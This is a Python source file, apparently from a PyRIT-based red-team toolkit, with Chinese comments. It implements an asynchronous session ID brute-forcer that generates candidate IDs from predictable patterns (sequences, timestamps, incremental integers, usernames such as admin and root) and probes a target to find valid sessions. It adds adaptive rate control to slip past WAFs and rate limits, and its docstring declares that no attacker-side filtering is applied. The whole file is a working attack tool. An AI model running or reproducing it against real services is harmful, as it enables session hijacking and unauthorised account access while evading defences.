# -*- coding: utf-8 -*-
"""session_brute_forcer.py — 智能 Session ID 暴力破解器

针对可预测模式 session ID 的智能暴力破解, 整合多种策略:
- 基于分析结果的限制搜索空间
- 自适应速率控制 (躲避 WAF/rate limit)
- 响应时间差异分析
- Early termination (达到目标即停止)

Academic basis:
    - OWASP: Brute Force Attack
    - CWE-307: Improper Restriction of Excessive Authentication Attempts
    - NIST SP 800-63B: Rate limiting for authentication

使用示例:
    forcer = SessionBruteForcer(http_target, config)
    result = await forcer.bruteforce(analysis_result, known_session)
    # → result.valid_sessions = [...]

Constitution compliance:
    - R-SIZE: < 800 行
    - R-H3: 单一职责 — 仅暴力破解, 不分析/验证
    - C1: 使用 PyRIT HTTPTarget
    - C2: 不添加任何攻击端过滤
    - R-S1: 字典/范围完全配置驱动
"""

from __future__ import annotations

import asyncio
import logging
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


class BruteStrategy(str, Enum):
    """暴力破解策略"""

    DICTIONARY = "dictionary"  # 字典
    INCREMENTAL = "incremental"  # 递增
    PATTERN_BASED = "pattern_based"  # 基于模式
    TIME_CORRELATED = "time_correlated"  # 时间相关


@dataclass
class BruteConfig:
    """暴力破解配置"""

    strategy: BruteStrategy = BruteStrategy.PATTERN_BASED
    max_attempts: int = 10000  # 最大尝试次数
    batch_size: int = 5  # 并发批次
    rate_limit_ms: int = 200  # 请求间隔
    adaptive_rate: bool = True  # 自适应速率
    jitter_ms: int = 50  # 随机抖动
    timeout_sec: float = 5.0  # 超时
    early_stop_count: int = 10  # 找到 N 个有效后停止
    dictionary_path: str | None = None  # 字典路径
    session_field: str = "session_id"
    probe_message: str = "ping"
    respect_rate_limit: bool = True  # 遇到 429 自动减速


@dataclass
class BruteResult:
    """暴力破解结果"""

    valid_sessions: list[str] = field(default_factory=list)
    total_attempts: int = 0
    elapsed_seconds: float = 0.0
    rate_limited_count: int = 0
    strategy_used: BruteStrategy = BruteStrategy.PATTERN_BASED

    @property
    def success_rate(self) -> float:
        if self.total_attempts == 0:
            return 0.0
        return len(self.valid_sessions) / self.total_attempts

    def to_dict(self) -> dict[str, Any]:
        return {
            "valid_sessions": self.valid_sessions,
            "total_attempts": self.total_attempts,
            "elapsed_seconds": self.elapsed_seconds,
            "rate_limited_count": self.rate_limited_count,
            "strategy_used": self.strategy_used.value,
            "success_rate": self.success_rate,
        }


class SessionBruteForcer:
    """智能 Session ID 暴力破解器

    整合 SessionIDAnalyzer 结果, 智能选择搜索空间和速率策略。
    自适应减速以规避 rate limiting, 同时最大化枚举速度。
    """

    def __init__(
        self,
        http_target: Any,
        config: BruteConfig | None = None,
    ):
        self.http_target = http_target
        self.config = config or BruteConfig()

    async def bruteforce(
        self,
        analysis_result: Any,  # AnalysisResult
        known_session: str,
    ) -> BruteResult:
        """执行智能暴力破解

        Args:
            analysis_result: SessionIDAnalyzer 分析结果
            known_session: 已知的有效 session

        Returns:
            BruteResult
        """
        start_time = time.time()
        result = BruteResult(strategy_used=self.config.strategy)

        # 生成候选列表
        candidates = self._generate_candidates(analysis_result, known_session)

        # 执行爆破
        for batch in self._batch(candidates[: self.config.max_attempts], self.config.batch_size):
            batch_results = await self._probe_batch(batch)

            for probe in batch_results:
                result.total_attempts += 1
                if probe.get("valid"):
                    result.valid_sessions.append(probe["session"])

                if probe.get("rate_limited"):
                    result.rate_limited_count += 1
                    if self.config.respect_rate_limit:
                        await self._backoff()

            # Early stop
            if len(result.valid_sessions) >= self.config.early_stop_count:
                break

        result.valid_sessions = list(set(result.valid_sessions))
        result.elapsed_seconds = time.time() - start_time
        return result

    def _generate_candidates(self, analysis_result: Any, known_session: str) -> list[str]:
        """根据分析结果生成候选列表"""
        pattern = analysis_result.pattern_type
        candidates: list[str] = []

        # Import locally for type checking
        from strike.session.session_id_analyzer import PatternType

        if pattern == PatternType.STRUCTURED_SEQ:
            candidates = self._generate_structured_candidates(analysis_result, known_session)
        elif pattern in (PatternType.TIMESTAMP_MS, PatternType.TIMESTAMP_S):
            candidates = self._generate_timestamp_candidates(analysis_result, known_session)
        elif pattern == PatternType.INCREMENTAL_INT:
            candidates = self._generate_incremental_candidates(analysis_result, known_session)
        elif pattern == PatternType.USER_DERIVED:
            candidates = self._generate_user_candidates(known_session)
        else:
            candidates = self._generate_generic_candidates(known_session)

        return candidates

    def _generate_structured_candidates(self, result: Any, known: str) -> list[str]:
        """生成结构化序列候选"""
        prefix = result.prefix or known.split("-")[0]
        date_part = result.date_format or known.split("-")[1]
        width = result.counter_width or 4

        upper = min(self.config.max_attempts, 10**width)
        return [f"{prefix}-{date_part}-{i:0{width}d}" for i in range(1, upper + 1)]

    def _generate_timestamp_candidates(self, result: Any, known: str) -> list[str]:
        """生成时间戳候选"""
        import re

        num_match = re.search(r"(\d+)$", known)
        if not num_match:
            return []

        base_ts = int(num_match.group(1))
        is_ms = result.pattern_type.value == "timestamp_ms"
        step = 1 if not is_ms else 1000

        # 前后 24h 窗口
        return [
            str(base_ts + i * step * direction)
            for direction in [-1, 1]
            for i in range(1, 43200)  # 12h / direction
        ]

    def _generate_incremental_candidates(self, result: Any, known: str) -> list[str]:
        """生成递增整数候选"""
        import re

        num_match = re.search(r"(\d+)$", known)
        if not num_match:
            return []

        current = int(num_match.group(1))
        upper = min(current + 1000, self.config.max_attempts)
        return [str(i) for i in range(1, upper + 1)]

    def _generate_user_candidates(self, known: str) -> list[str]:
        """生成用户名模式候选"""
        users = [
            "admin",
            "administrator",
            "root",
            "system",
            "operator",
            "user",
            "test",
            "guest",
            "demo",
            "dev",
            "staging",
            "alice",
            "bob",
            "charlie",
            "dave",
            "eve",
        ]

        prefix = known.split("_")[0] if "_" in known else ""
        suffix = known[len(prefix) + 1 :] if "_" in known else known

        # 替换用户名部分
        candidates = []
        for user in users:
            if user != prefix:
                candidates.append(f"{user}_{suffix}")

        return candidates

    def _generate_generic_candidates(self, known: str) -> list[str]:
        """通用模式: 前后扩展"""
        import re

        num_match = re.search(r"(\d+)$", known)
        if not num_match:
            return []

        base = num_match.group(1)
        prefix = known[: -len(base)]
        num = int(base)

        upper = min(num + self.config.max_attempts, 10 ** len(base) - 1)
        return [f"{prefix}{i:0{len(base)}d}" for i in range(1, upper + 1)]

    async def _probe_batch(self, batch: list[str]) -> list[dict[str, Any]]:
        """并发探测一批"""
        tasks = [self._probe_single(sid) for sid in batch]
        return await asyncio.gather(*tasks)

    async def _probe_single(self, session_id: str) -> dict[str, Any]:
        """探测单个"""
        try:
            payload = {
                "message": self.config.probe_message,
                self.config.session_field: session_id,
            }

            response = await self._send(payload)
            status = getattr(response, "status_code", 200)
            text = self._text(response)

            rate_limited = status == 429 or "rate limit" in text.lower()
            valid = status == 200 and "invalid" not in text.lower()

            return {"session": session_id, "valid": valid, "rate_limited": rate_limited}

        except Exception:
            return {"session": session_id, "valid": False, "rate_limited": False}

    async def _send(self, payload: dict[str, Any]) -> Any:
        """发送请求"""
        if hasattr(self.http_target, "send_request_async"):
            return await self.http_target.send_request_async(**payload)
        elif hasattr(self.http_target, "send_prompt_async"):
            return await self.http_target.send_prompt_async(
                prompt_text=payload.get("message", ""),
                prompt_request_metadata={self.config.session_field: payload.get(self.config.session_field)},
            )
        raise RuntimeError("HTTPTarget 不支持发送请求")

    async def _backoff(self):
        """自适应减速"""
        delay = self.config.rate_limit_ms / 1000 * 2
        jitter = random.uniform(0, self.config.jitter_ms / 1000)
        await asyncio.sleep(delay + jitter)

    def _batch(self, lst: list[str], n: int):
        """分批生成器"""
        for i in range(0, len(lst), n):
            yield lst[i : i + n]

    @staticmethod
    def _text(response: Any) -> str:
        """提取文本"""
        if isinstance(response, str):
            return response
        if hasattr(response, "text"):
            return str(response.text)
        if hasattr(response, "content"):
            c = response.content
            return c.decode("utf-8", errors="replace") if isinstance(c, bytes) else str(c)
        return str(response)
